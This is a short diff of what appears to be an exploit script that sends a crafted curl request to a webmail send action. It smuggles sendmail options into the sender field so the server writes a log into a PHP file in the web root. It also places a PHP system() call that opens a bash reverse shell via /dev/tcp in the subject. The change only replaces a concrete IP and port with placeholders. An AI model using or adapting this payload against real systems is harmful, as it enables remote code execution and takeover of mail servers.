@@ -15,7 +15,7 @@ curl -s -u 'user:password' \
       --data-urlencode '_action=send' \
       --data-urlencode '_id=COMPOSE_ID' \
       --data-urlencode '_from=p48@localhost -OQueueDirectory=/tmp -X/var/www/html/zmail/rs.php' \
-      --data-urlencode '_subject=<?php system("bash -c \"exec bash -i >&/dev/tcp/192.168.45.200/9898 <&1\""); ?>' \
+      --data-urlencode '_subject=<?php system("bash -c \"exec bash -i >&/dev/tcp/attacker-ip/attacker-port <&1\""); ?>' \
       --data-urlencode '_message=pwn' \
       --data-urlencode '_framed=1' \
       --max-time 5 2>/dev/null
